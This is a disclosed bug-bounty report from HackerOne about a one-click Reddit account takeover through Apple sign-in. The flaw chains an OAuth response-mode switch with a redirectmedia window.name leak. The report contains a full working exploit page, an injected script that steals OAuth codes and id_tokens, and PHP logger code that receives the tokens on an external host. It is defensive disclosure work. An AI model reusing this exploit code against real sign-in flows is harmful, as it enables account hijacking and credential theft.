{
  "id": 1567186,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY3MTg2",
  "url": "https://hackerone.com/reports/1567186",
  "title": "One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-05-12T14:03:26.547Z",
  "submitted_at": "2022-05-12T14:03:26.715Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fransrosen",
    "url": "/fransrosen",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35710,
    "url": "https://hackerone.com/reddit",
    "handle": "reddit",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Reddit",
      "twitter_handle": "reddit",
      "website": "https://www.reddit.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-08-02T15:13:53.849Z",
  "bug_reporter_agreed_on_going_public_at": "2022-08-02T15:00:16.189Z",
  "team_member_agreed_on_going_public_at": "2022-08-02T15:13:53.700Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\n# Description\n\nI've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.\n\nThe way it works is this:\n\n1. Attacker prepares a `state`-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.\n2. Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with `www.redditmedia.com`, which is an intentional sandbox but with a fun quirk, it uses `window.name` of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.\n3. The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the `state`-value that the attacker set. Also, the `response_type` is modified from `code` to `code+id_token` and the `response_mode` to `fragment`. This is the second important part why we can steal the code, since Reddit uses `response_mode=web_message` live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. **Reddit is not expecting to get any sensitive tokens in the URL fragment.** Also, the `redirect_uri` set in the OAuth-application in Apple for Reddit is allowing `https://reddit.com` only as the return page. This is something you need to remove, or point elsewhere. When you're using `response_mode=web_message`, the `redirect_uri` doesn't really matter what it is set to, since the whole origin of `https://reddit.com` will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.\n4. Victim clicks the link from the attacker page, will go through \"sign-in with Apple\" for Reddit, but with the attacker's `state`-parameter. When the login process is completed, the URL of the main page becomes `https://reddit.com/#state=xxx&code=xxx&access_token=xx`.\n5. The XSS on `www.redditmedia.com` in the first window, which has the same domain as the iframe, will be allowed to ask about the `window.name` of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.\n\nHere's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:\n\n{F1726830}\n\nAnd here's a link for testing:\n\n```\nhttps://fransrosen.com/reddit-hijack-424342.html\n```\n\n# Technical details\n\nHere's the HTML of the malicious page:\n\n```html\n<html>\n<style>pre { word-break: break-word; white-space: pre-wrap; }</style>\n<body>\n<div id=\"start\">\nAttacker, enter your Apple ID-OAuth URL when trying to <a href=\"https://reddit.com\" target=\"_blank\">sign in to Reddit here</a>:<br />\n<input id=\"state\">\n<button onclick=\"launch(extractstate(document.getElementById('state').value), true)\">Generate a victim URL with attacker's state</button>\n</div>\n\n\n<div id=\"fr\"></div>\n\n<script>\nvar inj, monitor;\nfunction extractstate(st) {\n    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;\n}\nfunction startmonitor(st) {\n    history.pushState('/','/',location.pathname + '?monitor&state=' + st)\n    monitor = setInterval(function() {\n        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {\n            if (e.length) {\n                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';\n                var p = document.createElement('pre');\n                p.innerText = 'opener.postMessage(\\'' + unescape(e.trim()) + '\\',\"*\");';\n                document.getElementById('fr').appendChild(p)\n                clearInterval(monitor);\n            }\n        });\n    }, 2000);\n}\nfunction launch(st, showonly) {\n    if (showonly) {\n        history.pushState('/','/',location.pathname + '?state=' + st)\n        document.getElementById('fr').innerText = 'Send this link to victim: ';\n        var p = document.createElement('pre');\n        p.innerText = location.href;\n        document.getElementById('fr').appendChild(p);\n        startmonitor(st);\n    } else {\n        document.getElementById('fr').innerHTML = '<iframe src=\"https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '\" frameborder=0 style=\"width: 500px; height: 300px\"></iframe>';\n    }\n    document.getElementById('start').innerHTML = '';\n}\nif (location.search && location.search.split('state=')[1].split('&')[0]) {\n    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);\n}\nwindow.onmessage = function(e) {\n    if (e.data === 'stopinject') {\n        console.log('frame injected');\n        clearInterval(inj)\n    }\n    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {\n        payload = JSON.parse(e.data);\n        data = payload.hash.replace('state=state=', 'state=');\n        var state = data.split('state=')[1].split('&')[0];\n        var code = data.split('code=')[1].split('&')[0];\n        var id_token = data.split('id_token=')[1].split('&')[0];\n        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});\n\n        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';\n        var p = document.createElement('pre');\n        p.innerText = payload;\n        document.getElementById('fr').appendChild(p);\n\n        var s = document.createElement('img');\n        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;\n        document.body.appendChild(s);   \n    }\n}\n\n</script>\n\n\n</body>\n</html>\n```\n\nWhat this page will do is:\n\n1. Ask the attacker to prepare the `state`-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.\n\n{F1726829}\n\n{F1726831}\n\n2. Load the `https://www.redditmedia.com` with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.\n3. The GTM-script will load, it looks like this:\n\n```html\n<script>var b, x;\nvar state = parent.location.href.substr(location.href.indexOf('state='));\nvar d = document.createElement('div');\nif (!window.inited) {\n  window.inited = true;\nd.innerHTML = '<a href=\"#\" onclick=\"b=window.open(\\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\\');\">Click here to hijack Apple access-token for Reddit</a>';\nparent.document.children[parent.document.children.length - 1].appendChild(d);\nif(top!==parent.window) top.postMessage('stopinject', '*');\nparent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };\nx = setInterval(function() {\nif(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {\n  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();\n  clearInterval(x);\n};\n\n}, 500);\n}\n</script>\n```\n\n4. This javascript will render the \"Click here\"-link:\n\n{F1726833}\n\nIt will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the `frames[1].window.name`, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains `code`, the value will be sent to the attacker main window through this frame. \n5. The attacker's main window will listen for a postMessage containing `code` and will show the state+code in the window. The page will then load an external logging-URL with the payload.\n\n{F1726835}\n\n6. The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:\n\n{F1726836}\n\n## Logging endpoints\n\nI've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.\n\n`https://USE-YOUR-OWN-LOGGER/reddit/log.php` looks like this:\n\n```php\n<?php\n\nif (isset($_SERVER['QUERY_STRING'])) {\n\tfile_put_contents('r.log', $_SERVER['QUERY_STRING'].\"\\n\", FILE_APPEND);\n}\n```\n\nAnd `https://USE-YOUR-OWN-LOGGER/reddit/parse.php` looks like this:\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Content-type: text/plain\");\n\n$key = @$_GET['q'];\nif (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }\n$data = explode(\"\\n\", file_get_contents('r.log'));\nforeach($data as $line) {\n\tif (strpos($line, $key) !== false) {\n\t\techo $line . \"\\n\";\n\t\tdie;\n\t}\n}\n```\n\n\n# Mitigation\n\n1. Remove fragment part when location is sent to www.redditmedia.com or any other party.\n2. Restrict your `redirect_uri` of Apple-ID to something that does not load a domain that could run arbitrary javascript.\n\n## Impact\n\nAttacker can sign in as the victim. There's minimal interaction needed, only one click.\n\nThis took quite some time to get built :) I hope you'll like it!\n\nRegards,\nFrans",
  "bounty_amount": "10000.0",
  "formatted_bounty": "$10,000",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1726829,
      "file_name": "Screen_Shot_2022-05-12_at_15.52.53.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jrk3eil8v72jaz2md1kjaooctu6z?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.52.53.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.52.53.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9bf393ed29f006c77fa047d138d4da0908c8e4cb0640c95d88549f0e2989db91",
      "file_size": 37462,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1726830,
      "file_name": "reddit-hijack.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gw9cy6qzhcjmuibovzaxsqdtrjrk?response-content-disposition=attachment%3B%20filename%3D%22reddit-hijack.mp4%22%3B%20filename%2A%3DUTF-8%27%27reddit-hijack.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=50170177b4e9e25de70b16f1d7ec383096bbaed42d0222773af1c48765a3dd18",
      "file_size": 9701743,
      "type": "video/mp4",
      "moderated": null
    },
    {
      "id": 1726831,
      "file_name": "Screen_Shot_2022-05-12_at_15.52.59.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vgsdqpaaml5q8kvhyrg74ksuo7ea?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.52.59.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.52.59.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1aa0503fdb79df387b02334e752b8a53d19776d4e67a79f9658a40d7f414e81d",
      "file_size": 32956,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1726833,
      "file_name": "Screen_Shot_2022-05-12_at_15.54.23.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b0mce3rvv3c4sj4q6i2ak7ef6j0n?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.54.23.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.54.23.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b4bd43d011f43ecc8827fa578848cfdda3983d684fe583342aa28910c6ed26ee",
      "file_size": 31542,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1726835,
      "file_name": "Screen_Shot_2022-05-12_at_16.00.54.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0c7wp5yo4mofb524hukxlu09m6x4?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_16.00.54.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_16.00.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=374693c90dac3c3edf6badf0deda8c09a6a74cb64d8d511f5fbb7cf6a4308c0f",
      "file_size": 60604,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1726836,
      "file_name": "Screen_Shot_2022-05-12_at_16.00.32.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fu6metvwusj8br8u4xbjea7dtpqh?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_16.00.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_16.00.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5K